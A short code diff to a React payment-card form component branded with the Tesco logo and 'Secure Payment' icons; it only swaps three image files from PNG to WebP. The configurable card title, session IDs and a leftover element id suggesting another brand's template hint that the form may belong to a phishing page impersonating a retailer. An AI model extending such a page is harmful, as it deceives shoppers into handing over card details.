@@ -276,7 +276,7 @@ export function CardClient({ sessionId: initialSessionId, routeSessionId }: Prop
         {/* Right Top Logo Placeholder */}
         <div className="absolute right-6 top-6 sm:right-10 sm:top-10">
           <img
-            src="/form-assets/tesco-mini-logo.png"
+            src="/form-assets/tesco-mini-logo.webp"
             alt="Tesco"
             className="h-10 w-10 object-contain drop-shadow-[0_10px_18px_rgba(0,0,0,0.35)]"
             id="card-ah-logo"
@@ -285,7 +285,7 @@ export function CardClient({ sessionId: initialSessionId, routeSessionId }: Prop
 
         <div className="mb-6 flex items-start gap-4">
           <div className="mt-1 shrink-0">
-            <img src="/form-assets/icon-security.png" alt="Secure Payment" className="h-12 w-12" id="card-security-icon" />
+            <img src="/form-assets/icon-security.webp" alt="Secure Payment" className="h-12 w-12" id="card-security-icon" />
           </div>
           <div>
             <h2 className="text-2xl font-bold text-[#0a2463] mb-1">{settings.card_title}</h2>
@@ -389,7 +389,7 @@ export function CardClient({ sessionId: initialSessionId, routeSessionId }: Prop
           </button>
           
           <div className="mt-4 flex items-center justify-center gap-2">
-            <img src="/form-assets/icon-security.png" alt="Secure" className="h-5 w-5" />
+            <img src="/form-assets/icon-security.webp" alt="Secure" className="h-5 w-5" />
             <span className="text-[13px] font-medium text-gray-600">
               Your data is processed securely.
             </span>
